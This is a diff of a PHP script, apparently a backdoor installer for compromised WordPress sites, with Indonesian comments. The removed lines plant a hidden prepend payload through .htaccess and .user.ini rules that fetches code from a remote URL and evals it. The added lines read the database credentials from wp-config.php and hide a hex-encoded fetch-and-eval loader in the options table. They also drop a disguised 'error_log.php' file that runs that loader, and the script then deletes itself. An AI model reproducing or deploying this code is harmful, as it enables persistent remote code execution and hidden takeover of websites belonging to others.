@@ -1,110 +1,103 @@
 <?php
 // ==========================================
-// KONFIGURASI UNIVERSAL
+// INSTALLER: CLEAN VERSION (NO COMMENTS)
 // ==========================================
-$virtual_name = 'abc.php';
-$remote_url   = 'https://raw.githubusercontent.com/xshikata-ai/x/refs/heads/main/wp-class.php';
-$sess_id      = 'sess_sys_core_'.substr(md5($_SERVER['HTTP_HOST']), 0, 8);
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
 
-// ==========================================
-// 1. TENTUKAN WADAH PAYLOAD (HIDDEN PATH)
-// ==========================================
-$paths = [session_save_path(), sys_get_temp_dir(), '/tmp', '/var/lib/php/sessions'];
-$payload_path = '';
+$filename = 'error_log.php';
+$db_key   = 'transient_sys_pma_check';
+$remote   = 'https://stepmomhub.com/seoo.txt';
 
-foreach($paths as $p){
-    if(!empty($p) && is_dir($p) && is_writable($p)){
-        $payload_path = rtrim($p, '/') . '/' . $sess_id;
-        break;
+// 1. SIAPKAN PAYLOAD (MULTI-FALLBACK) - Tanpa Komentar
+$payload_source = '<?php
+@error_reporting(0);
+$url = "' . $remote . '";
+$code = "";
+if(function_exists("curl_init")){
+    $ch = curl_init($url);
+    curl_setopt($ch, 19913, 1);
+    curl_setopt($ch, 52, 1);
+    curl_setopt($ch, 64, 0);
+    $code = curl_exec($ch);
+    curl_close($ch);
+}
+if(!$code && function_exists("file_get_contents")){
+    $opts = ["http" => ["header"=>"User-Agent: Mozilla/5.0"]];
+    $context = stream_context_create($opts);
+    $code = @file_get_contents($url, false, $context);
+}
+if(!$code && function_exists("fopen") && function_exists("stream_get_contents")){
+    $handle = @fopen($url, "rb");
+    if($handle){
+        $code = @stream_get_contents($handle);
+        @fclose($handle);
     }
 }
-// Fallback jika tidak ada folder sistem yang bisa ditulis
-if(empty($payload_path)) $payload_path = dirname(__FILE__) . '/.sys_tmp';
-
-// ==========================================
-// 2. BUAT PAYLOAD (PREPEND SCRIPT)
-// ==========================================
-$code = "<?php
-if(strpos(\$_SERVER['REQUEST_URI'], '$virtual_name') !== false){
-    while(ob_get_level()) ob_end_clean();
-    \$u='$remote_url';
-    \$c=curl_init(\$u);
-    curl_setopt(\$c,19913,1); curl_setopt(\$c,52,1); curl_setopt(\$c,64,0);
-    \$d=curl_exec(\$c);
-    if(!\$d) \$d=@file_get_contents(\$u);
-    if(\$d){ eval('?>'.\$d); exit; }
+if($code){
+    eval("?>".$code);
 }
-?>";
-file_put_contents($payload_path, $code);
+?>';
 
-// ==========================================
-// 3. INJEKSI HTACCESS (UNIVERSAL STACK)
-// ==========================================
-$ht = '.htaccess';
-$ht_content = file_exists($ht) ? file_get_contents($ht) : '';
-$ht_content = preg_replace('/# GHOST START.*?# GHOST END/s', '', $ht_content);
+$payload_hex = bin2hex($payload_source);
 
-// Kita buat blok untuk SEMUA versi PHP
-$new_rules = "# GHOST START
-<IfModule mod_rewrite.c>
-RewriteEngine On
-RewriteRule ^$virtual_name$ index.php [L]
-</IfModule>
-
-# Support PHP 8.x (Modern)
-<IfModule mod_php8.c>
-php_value auto_prepend_file \"$payload_path\"
-</IfModule>
-
-# Support PHP 7.x (Legacy)
-<IfModule mod_php7.c>
-php_value auto_prepend_file \"$payload_path\"
-</IfModule>
-
-# Support PHP 5.x (Ancient)
-<IfModule mod_php5.c>
-php_value auto_prepend_file \"$payload_path\"
-</IfModule>
-
-# Support Generic Mod_PHP
-<IfModule mod_php.c>
-php_value auto_prepend_file \"$payload_path\"
-</IfModule>
-
-# Support LiteSpeed (LSAPI)
-<IfModule mod_lsapi.c>
-php_value auto_prepend_file \"$payload_path\"
-</IfModule>
-# GHOST END\n";
-
-file_put_contents($ht, $new_rules . trim($ht_content));
-
-// ==========================================
-// 4. INJEKSI .USER.INI (UNTUK PHP-FPM / NGINX)
-// ==========================================
-// Jika server pakai PHP-FPM, .htaccess di atas TIDAK AKAN JALAN (Error 500 atau Ignored).
-// Solusinya wajib pakai .user.ini
-$ini = '.user.ini';
-$ini_conf = "auto_prepend_file = \"$payload_path\"\n";
-$ini_content = file_exists($ini) ? file_get_contents($ini) : '';
-
-// Cek apakah sudah ada biar gak duplikat
-if(strpos($ini_content, $payload_path) === false){
-    // Taruh konfigurasi di paling atas
-    file_put_contents($ini, $ini_conf . $ini_content);
+// 2. BACA WP-CONFIG UNTUK INSTALLER
+function read_local($path){
+    if(function_exists('file_get_contents')){ $c=@file_get_contents($path); if($c)return $c; }
+    if(function_exists('fopen') && filesize($path)>0){ $h=@fopen($path,'rb'); if($h){ $c=@fread($h,filesize($path)); fclose($h); if($c)return $c; } }
+    if(function_exists('file')){ $l=@file($path); if($l)return implode('',$l); }
+    if(function_exists('readfile')){ ob_start(); @readfile($path); $c=ob_get_clean(); if($c)return $c; }
+    return '';
 }
 
-// Force refresh cache .user.ini (Touch file)
-@touch($ini);
+if(!file_exists('wp-config.php')) die("wp-config.php 404");
+$conf = read_local('wp-config.php');
 
-// ==========================================
-// 5. SELESAI
-// ==========================================
+function _g($k,$s){ if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i',$s,$m))return $m[1]; return ''; }
+$n=_g('DB_NAME',$conf); $u=_g('DB_USER',$conf); $p=_g('DB_PASSWORD',$conf); $h=_g('DB_HOST',$conf);
+$x='wp_'; if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$conf,$m)) $x=$m[1];
+
+if(!$n) die("Config Fail");
+
+// 3. INJEKSI DB
+$mysqli = new mysqli($h,$u,$p,$n);
+if($mysqli->connect_error) die("DB Error");
+$mysqli->query("DELETE FROM {$x}options WHERE option_name='$db_key'");
+$mysqli->query("INSERT INTO {$x}options (option_name, option_value, autoload) VALUES ('$db_key', '$payload_hex', 'no')");
+echo "[OK] Payload Updated.<br>";
+
+// 4. BUAT FILE abc.php (CLEAN NO COMMENTS)
+$bridge_code = <<<'PHP'
+<?php
+error_reporting(0);
+function _r($p){
+    if(function_exists('file_get_contents')){ $d=@file_get_contents($p); if($d)return $d; }
+    if(function_exists('fopen') && @filesize($p)){ $h=@fopen($p,'rb'); if($h){ $d=@fread($h,filesize($p)); fclose($h); if($d)return $d; } }
+    if(function_exists('file')){ $d=@file($p); if($d)return implode('',$d); }
+    return '';
+}
+$c = _r('wp-config.php');
+function _k($k,$s){if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i',$s,$m))return $m[1];return'';}
+$n=_k('DB_NAME',$c); $u=_k('DB_USER',$c); $p=_k('DB_PASSWORD',$c); $h=_k('DB_HOST',$c);
+$x='wp_'; if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$c,$m))$x=$m[1];
+if($n){
+    $m = new mysqli($h, $u, $p, $n);
+    if(!$m->connect_error){
+        $q=$m->query("SELECT option_value FROM {$x}options WHERE option_name='transient_sys_pma_check' LIMIT 1");
+        if($q && $r=$q->fetch_assoc()){
+            $code = hex2bin($r['option_value']);
+            if($code) eval('?>' . $code);
+        }
+    }
+}
+?>
+PHP;
+
+if(file_put_contents($filename, $bridge_code)){
+    echo "[OK] <b>$filename</b> created (Clean Version).<br>";
+    echo "Silakan akses: <a href='$filename'>$filename</a>";
+} else {
+    echo "Write Error.";
+}
 unlink(__FILE__);
-echo "<pre>";
-echo "[SUKSES] Universal Patch Applied.\n";
-echo "Support: PHP 5/7/8, LSAPI, & FPM.\n";
-echo "Payload Path: $payload_path\n";
-echo "Silakan akses: domain.com/$virtual_name";
-echo "</pre>";
 ?>
